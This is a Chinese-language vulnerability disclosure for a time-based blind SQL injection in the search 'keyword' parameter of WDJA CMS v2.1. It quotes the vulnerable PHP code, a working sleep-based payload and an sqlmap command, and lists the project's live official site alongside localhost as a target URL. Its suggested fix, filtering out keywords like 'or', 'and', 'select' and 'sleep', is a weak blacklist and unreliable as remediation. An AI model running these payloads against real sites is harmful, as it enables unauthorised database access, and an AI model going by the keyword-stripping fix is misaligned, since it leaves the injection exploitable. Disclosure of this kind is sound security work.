 漏洞标题：WDJA博客内容管理系统2.1前台搜索sql注入漏洞

漏洞地址：https://github.com/shadoweb/wdja、http://www.wdja.net/

影响版本： v2.1

 发现时间： 2021-10-04

 发现人： xinghe

 分析报告： 

漏洞代码：`/search/common/incfiles/module_config.inc.php`，`tshkeyword`参数无过滤，导致数据库系统能够执行sql语句

```php
$tshkeyword = ii_get_safecode($_GET['keyword']);
foreach ($tshkeywords as $key => $val)
    {
      foreach ($tnfields as $tnfield)
      {
        if ($tnfield == 'topic') $tsqlstr .= " and " . ii_cfnames($tfpre, $tnfield) . " like '%" . $val . "%'";
        else $tsqlstr .= " or " . ii_cfnames($tfpre, $tnfield) . " like '%" . $val . "%'";
      }
    }
```

URl：`http://127.0.0.1/search/?type=list&keyword=88`或者是官网`https://www.wdja.net/search/?type=list&keyword=88`

参数：`keyword`

类型：`time-based blind`

输入参数如`88`

![image-20211004161937662](C:/Users/Asus/AppData/Roaming/Typora/typora-user-images/image-20211004161937662.png)

用burp抓包，使用payload进行测试：`fdfs"+and(select*from(select+sleep(3))a/**/union/**/select+1)="`，发现系统延迟了3秒才返回数据

![image-20211004163029697](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211004163029697.png)

当时间换为8秒时，系统也是延迟了8秒才返回数据

![image-20211004163201379](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211004163201379.png)

使用sqlmap进行测试:`sqlmap -r a.txt  --random-agent --level 5 --risk 3 -v --batch --dbms=mysql --time-sec 3 --technique T `

![image-20211004163318514](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211004163318514.png)

 修补方案：

严格过滤参数，去除or、and、select、sleep等数据库关键字
